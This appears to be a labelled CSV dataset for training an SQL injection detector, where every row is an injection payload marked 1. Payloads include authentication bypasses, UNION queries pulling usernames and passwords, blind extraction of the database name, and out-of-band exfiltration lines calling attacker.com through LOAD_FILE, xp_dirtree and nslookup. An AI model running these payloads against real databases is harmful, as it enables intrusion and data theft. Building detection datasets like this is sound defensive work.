content,label
' AND '1'='1,1
' AND '1'='2,1
' OR '1'='1,1
' OR '1'='2,1
' AND 1=1,1
' AND 1=2,1
' OR 1=1,1
' OR 1=2,1
' AND (SELECT COUNT(*) FROM users)>0,1
' AND (SELECT COUNT(*) FROM information_schema.tables)>10,1
' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>1,1
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) > 65",1
"' AND ASCII(SUBSTRING((SELECT DATABASE()), 1, 1)) < 90",1
' AND (SELECT 1 FROM dual) IS NOT NULL,1
' AND EXISTS(SELECT 1 FROM users WHERE username='admin'),1
' OR '1'='1' --,1
' OR '1'='1' #,1
' OR '1'='1' /*,1
' AND '1'='1' --,1
' AND '1'='1' #,1
' AND '1'='1' /*,1
' UNION SELECT NULL --,1
' UNION SELECT NULL #,1
' UNION SELECT NULL /*,1
"' UNION SELECT username, password FROM users --",1
"' UNION SELECT NULL, NULL FROM information_schema.tables #",1
"' UNION SELECT 1,2 WHERE DATABASE()='test_db' --",1
"' AND IF(1=1, 'true', 'false') --",1
"' AND IF(ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65,'true','false') --",1
' AND LENGTH(DATABASE())>5 #,1
' OR 1=1 --,1
' OR 1=1 #,1
' OR 1=1 /*,1
"' UNION SELECT 1,2 FROM mysql.db WHERE '1'='1' --",1
"' AND 1=IF((SELECT DATABASE())='test',1,0) --",1
"' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
'; EXEC xp_dirtree '\\attacker.com\data'--,1
'; EXEC xp_fileexist '\\attacker.com\check'--,1
"' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
"' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
